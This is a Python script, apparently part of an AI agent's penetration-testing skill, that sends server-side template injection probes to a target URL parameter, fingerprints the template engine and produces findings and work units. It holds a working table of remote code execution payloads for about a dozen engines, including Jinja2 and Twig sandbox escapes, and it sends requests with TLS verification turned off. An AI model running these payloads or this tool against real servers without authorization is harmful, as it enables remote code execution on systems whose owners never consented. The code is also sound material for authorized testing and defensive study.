#!/usr/bin/env python3
"""ssti_probe.py — SSTI probe planner / sender / fingerprinter for the ssti-testing skill.

Modes
  plan (default)   : print the ordered probe set + response->engine map (+ RCE payload
                     for --engine) as JSON on stdout for manual injection.
  --send           : inject every probe into --url/--param via urllib, grep responses
                     for evaluation markers, walk the differential tree, print verdict.
  --work-units F   : write a rupu work-units JSON array (first char '[') for fan-out
                     via the `work-units` skill.
  --finding F      : write a findings.report payload (scope endpoint, WSTG-INPV-18 /
                     CWE-1336) for the `finding-report` skill. Needs a confirmed eval
                     from --send, or --engine plus --rce-output supplied manually.

Examples
  python3 scripts/ssti_probe.py --url https://example.com/greet --param name
  python3 scripts/ssti_probe.py --url https://example.com/greet --param name --send \
      --work-units ssti-units.json
  python3 scripts/ssti_probe.py --url https://example.com/post --param subject \
      --method POST --data 'subject=FUZZ&body=hi' --send --finding finding.json
  python3 scripts/ssti_probe.py --engine jinja2 --cmd id      # just the RCE payloads
"""

import argparse
import json
import re
import ssl
import sys
import time
import urllib.error
import urllib.parse
import urllib.request

ML, MR = "s9l", "s9r"  # unique markers wrapped around every probe

POLYGLOT = "${{<%[%'\"}}%\\"

# Ordered probes. "expect" is the substring (between markers) that proves evaluation.
PROBES = [
    {"id": "polyglot", "payload": POLYGLOT, "expect": None,
     "note": "error/stripping => input reaches a template parser"},
    {"id": "curly2", "payload": "{{7*7}}", "expect": "49",
     "engines": ["jinja2", "twig", "nunjucks"]},
    {"id": "curly2-str", "payload": "{{7*'7'}}", "expect": None,
     "note": "7777777=jinja2  49=twig  error=>nunjucks check"},
    {"id": "nunjucks-ctor", "payload": "{{range.constructor}}", "expect": "function",
     "engines": ["nunjucks"]},
    {"id": "dollar", "payload": "${7*7}", "expect": "49",
     "engines": ["freemarker", "velocity", "mako"]},
    {"id": "fm-builtin", "payload": "${\"z\"?upper_case}", "expect": "Z",
     "engines": ["freemarker"]},
    {"id": "dollar-str", "payload": "${7*'7'}", "expect": "7777777",
     "engines": ["mako"]},
    {"id": "velocity-set", "payload": "#set($x=7*7)${x}", "expect": "49",
     "engines": ["velocity"]},
    {"id": "hash", "payload": "#{7*7}", "expect": "49",
     "engines": ["pug", "slim", "ruby-interp"]},
    {"id": "erb", "payload": "<%= 7*7 %>", "expect": "49",
     "engines": ["erb", "ejs"]},
    {"id": "smarty", "payload": "{7*7}", "expect": "49",
     "engines": ["smarty"]},
    {"id": "thymeleaf", "payload": "[[${7*7}]]", "expect": "49",
     "engines": ["thymeleaf", "spel"]},
]

ERROR_SIGNATURES = {
    "jinja2.exceptions": "jinja2",
    "TemplateSyntaxError": "jinja2",
    "Twig\\Error": "twig",
    "Twig_Error": "twig",
    "freemarker.core": "freemarker",
    "freemarker.template": "freemarker",
    "org.apache.velocity": "velocity",
    "VelocityException": "velocity",
    "SmartyCompilerException": "smarty",
    "SmartyException": "smarty",
    "mako.exceptions": "mako",
    "(erb):": "erb",
    "Template render error": "nunjucks",
    "org.thymeleaf": "thymeleaf",
    "org.springframework.expression.spel": "spel",
    "django.template.exceptions": "django",
}

RCE = {
    "jinja2": "{{cycler.__init__.__globals__.os.popen('CMD').read()}}",
    "twig": "{{['CMD']|filter('system')}}",
    "twig1": "{{_self.env.registerUndefinedFilterCallback(\"system\")}}{{_self.env.getFilter(\"CMD\")}}",
    "freemarker": "<#assign ex=\"freemarker.template.utility.Execute\"?new()>${ex(\"CMD\")}",
    "velocity": "#set($e=\"e\")#set($rt=$e.getClass().forName(\"java.lang.Runtime\"))$rt.getRuntime().exec(\"CMD\")",
    "smarty": "{system('CMD')}",
    "mako": "${__import__('os').popen('CMD').read()}",
    "erb": "<%= `CMD` %>",
    "pug": "#{root.process.mainModule.require('child_process').execSync('CMD')}",
    "nunjucks": "{{range.constructor(\"return global.process.mainModule.require('child_process').execSync('CMD').toString()\")()}}",
    "thymeleaf": "__${T(java.lang.Runtime).getRuntime().exec(\"CMD\")}__::.x",
    "spel": "${T(java.lang.Runtime).getRuntime().exec(\"CMD\")}",
}

SANDBOX_FALLBACK = {
    "jinja2": "{{self._TemplateReference__context.cycler.__init__.__globals__.os.popen('CMD').read()}}",
    "twig": "{{['CMD']|map('system')|join}}",
}


def build_request(url, param, payload, method, data, headers):
    """Place ML+payload+MR into the target param (GET query or POST body).
    In --data, the literal token FUZZ is replaced; otherwise param=value is set."""
    marked = ML + payload + MR
    hdrs = {"User-Agent": "Mozilla/5.0"}
    for h in headers or []:
        k, _, v = h.partition(":")
        hdrs[k.strip()] = v.strip()
    if method == "POST":
        body = data or (param + "=FUZZ")
        if "FUZZ" in body:
            body = body.replace("FUZZ", urllib.parse.quote(marked, safe=""))
        else:
            pairs = urllib.parse.parse_qsl(body, keep_blank_values=True)
            pairs = [(k, marked if k == param else v) for k, v in pairs]
            body = urllib.parse.urlencode(pairs)
        hdrs.setdefault("Content-Type", "application/x-www-form-urlencoded")
        return urllib.request.Request(url, data=body.encode(), headers=hdrs,
                                      method="POST"), "POST " + url + "\n" + body
    parts = urllib.parse.urlsplit(url)
    pairs = urllib.parse.parse_qsl(parts.query, keep_blank_values=True)
    if any(k == param for k, _ in pairs):
        pairs = [(k, marked if k == param else v) for k, v in pairs]
    else:
        pairs.append((param, marked))
    q = urllib.parse.urlencode(pairs)
    full = urllib.parse.urlunsplit((parts.scheme, parts.netloc, parts.path, q, ""))
    return urllib.request.Request(full, headers=hdrs), "GET " + full


def send(req, timeout):
    ctx = ssl.create_default_context()
    ctx.check_hostname = False
    ctx.verify_mode = ssl.CERT_NONE
    try:
        with urllib.request.urlopen(req, timeout=timeout, context=ctx) as r:
            return r.status, r.read().decode("utf-8", "replace")
    except urllib.error.HTTPError as e:
        return e.code, e.read().decode("utf-8", "replace")
    except Exception as e:  # noqa: BLE001 - network errors become observations
        return 0, "TRANSPORT-ERROR: %s" % e


def marked_value(body):
    """Return what appeared between the markers, or None if markers absent."""
    m = re.search(re.escape(ML) + "(.*?)" + re.escape(MR), body, re.S)
    return m.group(1) if m else None


def fingerprint(results):
    """results: probe_id -> dict(status, between, body). Walk the tree."""
    def val(pid):
        r = results.get(pid)
        return r["between"] if r else None

    for sig, eng in ERROR_SIGNATURES.items():
        for r in results.values():
            if sig in r["body"]:
                return eng, "error-signature:" + sig
    s = val("curly2-str")
    if s == "7777777":
        return "jinja2", "{{7*'7'}}=7777777"
    if s == "49":
        return "twig", "{{7*'7'}}=49"
    if val("nunjucks-ctor") and "function" in (val("nunjucks-ctor") or ""):
        return "nunjucks", "{{range.constructor}}=function"
    if val("fm-builtin") == "Z":
        return "freemarker", '${"z"?upper_case}=Z'
    if val("dollar-str") == "7777777":
        return "mako", "${7*'7'}=7777777"
    if val("velocity-set") == "49":
        return "velocity", "#set($x=7*7)${x}=49"
    if val("curly2") == "49":
        return "jinja2-or-twig", "{{7*7}}=49 (differential inconclusive)"
    if val("dollar") == "49":
        return "freemarker-velocity-mako", "${7*7}=49 (refine manually)"
    if val("erb") == "49":
        return "erb", "<%= 7*7 %>=49"
    if val("hash") == "49":
        return "pug-slim-ruby", "#{7*7}=49"
    if val("smarty") == "49":
        return "smarty", "{7*7}=49"
    if val("thymeleaf") == "49":
        return "thymeleaf", "[[${7*7}]]=49"
    return None, "no evaluation observed"


def slug(s):
    return re.sub(r"-+", "-", re.sub(r"[^a-z0-9]+", "-", s.lower())).strip("-")


def make_work_unit(url, param, method, data, engine, confidence, evidence, cmd):
    host = urllib.parse.urlsplit(url).netloc or "target"
    path = urllib.parse.urlsplit(url).path or "/"
    uid = slug("ssti-%s-%s-%s" % (host, path, param))
    hints = {"param": param, "method": method, "engine": engine or "unknown",
             "confidence": confidence,
             "reference": "exploitation.md"}
    if data:
        hints["body"] = data
    if evidence:
        hints["evidence"] = evidence
    if engine in RCE:
        hints["next_payload"] = RCE[engine].replace("CMD", cmd)
    return {"id": uid,
            "title": "SSTI candidate: param '%s' at %s (%s, %s)" % (
                param, url, engine or "engine unknown", confidence),
            "targets": [url],
            "hints": hints}


def make_finding(url, param, engine, request_txt, response_txt, rce_output, cmd):
    sev = "critical" if rce_output else "high"
    rationale = (
        "The '%s' parameter at %s is evaluated by the %s template engine "
        "(server-side template injection). Differential arithmetic probes "
        "returned engine-computed results instead of literal echoes." % (param, url, engine))
    if rce_output:
        rationale += (" The engine-specific payload executed the OS command '%s' "
                      "and returned its output, proving remote code execution." % cmd)
    return {
        "title": "Server-Side Template Injection (%s) in '%s' parameter%s" % (
            engine, param, " leading to RCE" if rce_output else ""),
        "scope": "endpoint",
        "target_ref": url,
        "severity": sev,
        "classification": ["WSTG-INPV-18", "CWE-1336", "CWE-94"],
        "evidence": {
            "rationale": rationale,
            "request": request_txt or "(attach the raw probe request)",
            "response": response_txt or "(attach the evaluated response)",
        },
    }


def main():
    ap = argparse.ArgumentParser(description=__doc__,
                                 formatter_class=argparse.RawDescriptionHelpFormatter)
    ap.add_argument("--url", help="target URL")
    ap.add_argument("--param", help="parameter to inject")
    ap.add_argument("--method", default="GET", choices=["GET", "POST"])
    ap.add_argument("--data", help="POST body template; FUZZ marks the injection point")
    ap.add_argument("-H", "--header", action="append", help="extra header 'K: V' (repeatable)")
    ap.add_argument("--send", action="store_true", help="actually send the probes")
    ap.add_argument("--timeout", type=float, default=15.0)
    ap.add_argument("--delay", type=float, default=0.0, help="seconds between probes")
    ap.add_argument("--engine", help="known/forced engine for RCE payload + finding")
    ap.add_argument("--cmd", default="id", help="OS command for RCE payloads")
    ap.add_argument("--rce-output", help="observed command output / OAST hit (for --finding)")
    ap.add_argument("--work-units", metavar="FILE", help="write rupu work-units JSON array")
    ap.add_argument("--finding", metavar="FILE", help="write findings.report JSON payload")
    args = ap.parse_args()

    # Engine-only mode: just print payloads.
    if args.engine and not args.url:
        out = {"engine": args.engine,
               "rce": RCE.get(args.engine, "unknown engine; see exploitation.md").replace("CMD", args.cmd),
               "sandbox_fallback": SANDBOX_FALLBACK.get(args.engine, "").replace("CMD", args.cmd)}
        print(json.dumps(out, indent=2))
        return

    if not args.url or not args.param:
        ap.error("--url and --param required (or --engine alone for payloads)")

    results = {}
    plan = []
    last_req_txt = last_resp_txt = None
    for p in PROBES:
        req, req_txt = build_request(args.url, args.param, p["payload"],
                                     args.method, args.data, args.header)
        entry = {"id": p["id"], "payload": ML + p["payload"] + MR,
                 "expect": (ML + p["expect"] + MR) if p.get("expect") else p.get("note", ""),
                 "engines": p.get("engines", []), "request": req_txt}
        plan.append(entry)
        if args.send:
            status, body = send(req, args.timeout)
            between = marked_value(body)
            results[p["id"]] = {"status": status, "between": between, "body": body}
            entry["status"] = status
            entry["observed"] = between
            if between is not None and p.get("expect") and p["expect"] in between:
                entry["evaluated"] = True
                last_req_txt, last_resp_txt = req_txt, body[:4000]
            if args.delay:
                time.sleep(args.delay)

    engine, reason = (args.engine, "operator-supplied") if args.engine else (None, "not sent")
    if args.send and not args.engine:
        engine, reason = fingerprint(results)

    confirmed = args.send and engine is not None and "no evaluation" not in reason
    confidence = ("confirmed-eval" if confirmed else
                  ("probe-plan" if not args.send else "no-signal"))

    verdict = {
        "target": args.url, "param": args.param, "method": args.method,
        "engine": engine, "fingerprint_reason": reason, "confidence": confidence,
        "rce_payload": RCE.get(engine, "").replace("CMD", args.cmd) if engine in RCE else None,
        "probes": plan,
    }
    print(json.dumps(verdict, indent=2))

    if args.work_units:
        evidence = reason if confirmed else None
        units = [make_work_unit(args.url, args.param, args.method, args.data,
                                engine, confidence, evidence, args.cmd)]
        with open(args.work_units, "w") as f:
            json.dump(units, f, indent=2)
        sys.stderr.write("[+] work units -> %s (feed to the work-units skill)\n" % args.work_units)

    if args.finding:
        if not (confirmed or (args.engine and args.rce_output)):
            sys.stderr.write("[-] refusing to write a finding without a confirmed "
                             "evaluation (--send) or --engine + --rce-output\n")
            sys.exit(2)
        eng = engine or args.engine
        finding = make_finding(args.url, args.param, eng,
                               last_req_txt, args.rce_output or last_resp_txt,
                               args.rce_output, args.cmd)
        with open(args.finding, "w") as f:
            json.dump(finding, f, indent=2)
        sys.stderr.write("[+] findings.report payload -> %s (submit via the "
                         "finding-report skill)\n" % args.finding)


if __name__ == "__main__":
    main()
